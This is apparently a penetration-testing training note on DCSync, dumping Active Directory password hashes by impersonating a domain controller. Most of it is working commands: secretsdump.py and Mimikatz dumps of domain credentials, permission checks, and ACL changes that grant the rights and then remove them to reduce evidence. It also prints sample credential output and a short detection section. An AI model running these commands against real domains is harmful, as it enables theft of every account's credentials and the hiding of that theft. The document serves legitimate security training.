# DCSync

DCSync is a technique for stealing the Active Directory password database by impersonating a Domain Controller and using the built-in [Directory Replication Service Remote Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/f977faaa-673e-4f66-b9bf-48c640241d47) to request credential replication. Rather than touching disk on the target DC, the attacker pulls hashes directly over the network by mimicking legitimate DC-to-DC replication traffic.

***

## Required Permissions

To execute DCSync, an account needs two extended rights on the domain object:

- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

Domain Admins and Enterprise Admins hold these by default. It is also common to find standard users granted these rights, often as a legacy configuration or through software installs. Verify the rights are in place before attempting the attack:

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

Confirm the account is not in any privileged group itself, as the rights may be granted directly on the domain object rather than via group membership:

```powershell
Get-DomainUser -Identity adunn | select samaccountname,objectsid,memberof,useraccountcontrol | fl
```

***

## DCSync from Linux with secretsdump.py

[Impacket's secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) is the simplest way to run DCSync from a Linux attack host. The `-just-dc` flag extracts NTLM hashes and Kerberos keys from the NTDS file:

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

This generates three output files:

| File | Contents |
|------|----------|
| `inlanefreight_hashes.ntds` | NTLM hashes for all domain accounts |
| `inlanefreight_hashes.ntds.kerberos` | Kerberos keys |
| `inlanefreight_hashes.ntds.cleartext` | Cleartext passwords for accounts with reversible encryption enabled |

### Useful Flags

| Flag | Purpose |
|------|---------|
| `-just-dc-ntlm` | Return only NTLM hashes, skip Kerberos keys |
| `-just-dc-user <USERNAME>` | Extract data for a single user only |
| `-pwd-last-set` | Include password last-set timestamps in output |
| `-history` | Dump password history for offline cracking or strength metrics |
| `-user-status` | Flag disabled accounts so they can be excluded from cracking statistics |

The `-user-status` flag is particularly useful when compiling client-facing password audit statistics. Reporting cracking rates, top 10 passwords, and reuse figures against only active accounts gives the client a more accurate picture of their security posture.

***

## Reversible Encryption

Certain accounts may be configured with reversible encryption on their passwords. This does not mean cleartext storage; passwords are stored using RC4 encryption, with the decryption key held in the registry ([Syskey](https://docs.microsoft.com/en-us/windows-server/security/kerberos/system-key-utility-technical-overview)). During a DCSync dump, secretsdump.py automatically decrypts these and writes them to the `.cleartext` file.

Example output:

```
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

Identify accounts with this setting using native cmdlets:

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

Or using PowerView:

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

This setting is occasionally configured intentionally to allow periodic password audits without offline cracking, but it is a significant security risk since any DCSync-capable attacker gets the cleartext immediately.

***

## DCSync from Windows with Mimikatz

Mimikatz must run in the context of an account that holds replication rights. Use `runas /netonly` to spawn a shell in `adunn`'s context without needing an interactive logon:

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

From that PowerShell window, run Mimikatz and execute the DCSync module:

```
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

Example output:

```
SAM Username         : administrator
Account Type         : USER_OBJECT
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
```

You can target any account by changing the `/user:` parameter. Targeting `krbtgt` is common for Golden Ticket creation (covered in advanced modules). Target `administrator` first to confirm the attack works before pivoting to other accounts.

***

## Granting DCSync Rights via WriteDACL

If you have `WriteDACL` over the domain object, you can grant DCSync rights to any account you control, execute the attack, and then remove the rights to reduce evidence:

```powershell
Add-DomainObjectACL -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity <youruser> -Rights DCSync -Verbose
```

Remove them afterward:

```powershell
Remove-DomainObjectACL -TargetIdentity "DC=inlanefreight,DC=local" -PrincipalIdentity <youruser> -Rights DCSync -Verbose
```

Even with cleanup, Event ID `5136` will fire for each ACL modification, so evidence of this path will exist in the logs.

***

## Detection

DCSync generates Event ID `4662` (`An operation was performed on an object`) with the Access Mask `0x100` or `0x10000` and the `DS-Replication-Get-Changes-All` GUID in the properties field. A non-DC computer account or standard user account generating `4662` events against the domain object is a strong indicator of DCSync activity. In large environments, Security teams can filter `4662` events to only show entries where the caller is not a known Domain Controller computer account, which significantly reduces noise and surfaces real incidents quickly.
